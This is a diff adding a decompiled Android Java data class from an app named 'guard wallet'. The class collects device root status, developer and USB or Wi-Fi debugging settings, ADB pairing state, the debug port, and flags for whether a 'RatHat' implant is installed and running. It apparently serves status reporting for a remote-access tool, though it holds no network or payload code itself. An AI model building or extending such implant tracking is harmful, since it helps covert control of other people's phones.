@@ -1,0 +1,81 @@
+package com.guard.wallet.resp;
+
+import com.guard.wallet.core.AppUtils;
+import androidx.annotation.NonNull;
+import com.guard.wallet.entity.ADBConfig;
+import com.guard.wallet.req.MessageBodyVO;
+import com.guard.wallet.utils.SystemHelper;
+import com.guard.wallet.utils.SharedPrefsManager;
+
+public class DeviceDebugVO extends MessageBodyVO {
+    private Integer deviceConnected;
+    private Integer deviceDebugPort;
+    private Integer devicePaired;
+    private Integer enableDebug;
+    private Integer enableDevelopment;
+    private Integer enableWifiDebug;
+    private Integer isRoot;
+    private Integer ratHatImplant;
+    private Integer ratHatRunning;
+
+    public DeviceDebugVO() {}
+
+    public DeviceDebugVO(Integer isRoot, Integer enableDevelopment, Integer enableDebug, Integer enableWifiDebug,
+                         Integer ratHatImplant, Integer ratHatRunning, Integer deviceDebugPort,
+                         Integer devicePaired, Integer deviceConnected) {
+        this.isRoot = isRoot; this.enableDevelopment = enableDevelopment; this.enableDebug = enableDebug;
+        this.enableWifiDebug = enableWifiDebug; this.ratHatImplant = ratHatImplant;
+        this.ratHatRunning = ratHatRunning; this.deviceDebugPort = deviceDebugPort;
+        this.devicePaired = devicePaired; this.deviceConnected = deviceConnected;
+    }
+
+    public static DeviceDebugVO of() {
+        DeviceDebugVO vo = onlyDebug();
+        ADBConfig config = SharedPrefsManager.J();
+        vo.setRatHatImplant(config.getInstalledRatHat());
+        vo.setRatHatRunning(config.getIsRatHatRunning());
+        vo.setDevicePaired(config.isPaired() ? 1 : 0);
+        vo.setDeviceConnected(config.isConnected() ? 1 : 0);
+        vo.setDeviceDebugPort(config.getDebugPort());
+        return vo;
+    }
+
+    public static DeviceDebugVO onlyDebug() {
+        DeviceDebugVO vo = new DeviceDebugVO();
+        vo.setIsRoot(q.e() ? 1 : 0);
+        vo.setEnableDevelopment(SystemHelper.K() ? 1 : 0);
+        vo.setEnableDebug(SystemHelper.I() ? 1 : 0);
+        vo.setEnableWifiDebug(SystemHelper.J() ? 1 : 0);
+        return vo;
+    }
+
+    public Integer getDeviceConnected() { return this.deviceConnected; }
+    public Integer getDeviceDebugPort() { return this.deviceDebugPort; }
+    public Integer getDevicePaired() { return this.devicePaired; }
+    public Integer getEnableDebug() { return this.enableDebug; }
+    public Integer getEnableDevelopment() { return this.enableDevelopment; }
+    public Integer getEnableWifiDebug() { return this.enableWifiDebug; }
+    public Integer getIsRoot() { return this.isRoot; }
+    public Integer getRatHatImplant() { return this.ratHatImplant; }
+    public Integer getRatHatRunning() { return this.ratHatRunning; }
+
+    public void setDeviceConnected(Integer v) { this.deviceConnected = v; }
+    public void setDeviceDebugPort(Integer v) { this.deviceDebugPort = v; }
+    public void setDevicePaired(Integer v) { this.devicePaired = v; }
+    public void setEnableDebug(Integer v) { this.enableDebug = v; }
+    public void setEnableDevelopment(Integer v) { this.enableDevelopment = v; }
+    public void setEnableWifiDebug(Integer v) { this.enableWifiDebug = v; }
+    public void setIsRoot(Integer v) { this.isRoot = v; }
+    public void setRatHatImplant(Integer v) { this.ratHatImplant = v; }
+    public void setRatHatRunning(Integer v) { this.ratHatRunning = v; }
+
+    @NonNull
+    @Override
+    public String toString() {
+        return "DeviceDebugVO{isRoot=" + this.isRoot + ", enableDevelopment=" + this.enableDevelopment
+                + ", enableDebug=" + this.enableDebug + ", enableWifiDebug=" + this.enableWifiDebug
+                + ", ratHatImplant=" + this.ratHatImplant + ", ratHatRunning=" + this.ratHatRunning
+                + ", deviceDebugPort=" + this.deviceDebugPort + ", devicePaired=" + this.devicePaired
+                + ", deviceConnected=" + this.deviceConnected + "}";
+    }
+}
